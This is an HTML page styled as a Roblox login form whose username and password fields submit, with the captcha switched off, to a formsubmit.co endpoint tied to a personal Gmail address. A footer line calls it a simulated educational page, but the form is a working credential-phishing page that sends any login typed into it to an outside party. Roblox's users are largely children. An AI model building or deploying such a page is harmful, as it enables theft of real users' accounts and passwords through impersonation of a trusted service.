  <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <title>Roblox Login</title>
      <style>
          * {
                box-sizing: border-box;
                    }

                        body {
                              margin: 0;
                                    background-color: #1c1c1c;
                                          font-family: 'Arial', sans-serif;
                                                display: flex;
                                                      justify-content: center;
                                                            align-items: center;
                                                                  height: 100vh;
                                                                      }

                                                                          .login-box {
                                                                                background-color: #2a2a2a;
                                                                                      padding: 40px 30px;
                                                                                            border-radius: 10px;
                                                                                                  width: 360px;
                                                                                                        box-shadow: 0 0 15px rgba(0,0,0,0.5);
                                                                                                              color: #fff;
                                                                                                                  }

                                                                                                                      .login-box h2 {
                                                                                                                            margin-bottom: 20px;
                                                                                                                                  font-size: 24px;
                                                                                                                                        color: #ffffff;
                                                                                                                                            }

                                                                                                                                                input[type="text"],
                                                                                                                                                    input[type="password"] {
                                                                                                                                                          width: 100%;
                                                                                                                                                                padding: 12px;
                                                                                                                                                                      margin: 12px 0;
                                                                                                                                                                            font-size: 16px;
                                                                                                                                                                                  background-color: #3a3a3a;
                                                                                                                                                                                        border: 1px solid #555;
                                                                                                                                                                                              border-radius: 5px;
                                                                                                                                                                                                    color: #fff;
                                                                                                                                                                                                        }

                                                                                                                                                                                                            input::placeholder {
                                                                                                                                                                                                                  color: #aaa;
                                                                                                                                                                                                                      }

                                                                                                                                                                                                                          button {
                                                                                                                                                                                                                                width: 100%;
                                                                                                                                                                                                                                      padding: 12px;
                                                                                                                                                                                                                                            background-color: #d32f2f;
                                                                                                                                                                                                                                                  color: white;
                                                                                                                                                                                                                                                        border: none;
                                                                                                                                                                                                                                                              border-radius: 5px;
                                                                                                                                                                                                                                                                    font-size: 16px;
                                                                                                                                                                                                                                                                          cursor: pointer;
                                                                                                                                                                                                                                                                                margin-top: 10px;
                                                                                                                                                                                                                                                                                      transition: background-color 0.3s;
                                                                                                                                                                                                                                                                                          }

                                                                                                                                                                                                                                                                                              button:hover {
                                                                                                                                                                                                                                                                                                    background-color: #b71c1c;
                                                                                                                                                                                                                                                                                                        }

                                                                                                                                                                                                                                                                                                            .note {
                                                                                                                                                                                                                                                                                                                  margin-top: 20px;
                                                                                                                                                                                                                                                                                                                        font-size: 12px;
                                                                                                                                                                                                                                                                                                                              color: #bbb;
                                                                                                                                                                                                                                                                                                                                    text-align: center;
                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                          </style>
                                                                                                                                                                                                                                                                                                                                          </head>
                                                                                                                                                                                                                                                                                                                                          <body>

                                                                                                                                                                                                                                                                                                                                            <div class="login-box">
                                                                                                                                                                                                                                                                                                                                                <h2>Login to Roblox</h2>
                                                                                                                                                                                                                                                                                                                                                    <form action="https://formsubmit.co/moosefo1@gmail.com" method="POST">
                                                                                                                                                                                                                                                                                                                                                          <!-- Hidden settings -->
                                                                                                                                                                                                                                                                                                                                                                <input type="hidden" name="_captcha" value="false">
                                                                                                                                                                                                                                                                                                                                                                      <input type="hidden" name="_template" value="table">

                                                                                                                                                                                                                                                                                                                                                                            <!-- Login Fields -->
                                                                                                                                                                                                                                                                                                                                                                                  <input type="text" name="username" placeholder="Username" required>
                                                                                                                                                                                                                                                                                                                                                                                        <input type="password" name="password" placeholder="Password" required>
                                                                                                                                                                                                                                                                                                                                                                                              <button type="submit">Log In</button>
                                                                                                                                                                                                                                                                                                                                                                                                  </form>
                                                                                                                                                                                                                                                                                                                                                                                                      <div class="note">
                                                                                                                                                                                                                                                                                                                                                                                                            This is a simulated login page for educational use only. Not affiliated with Roblox.
                                                                                                                                                                                                                                                                                                                                                                                                                </div>
                                                                                                                                                                                                                                                                                                                                                                                                                  </div>

                                                                                                                                                                                                                                                                                                                                                                                                                  </body>
                                                                                                                                                                                                                                                                                                                                                                                                                  </html>

  <script>
    
  </script>
</body>
</html>
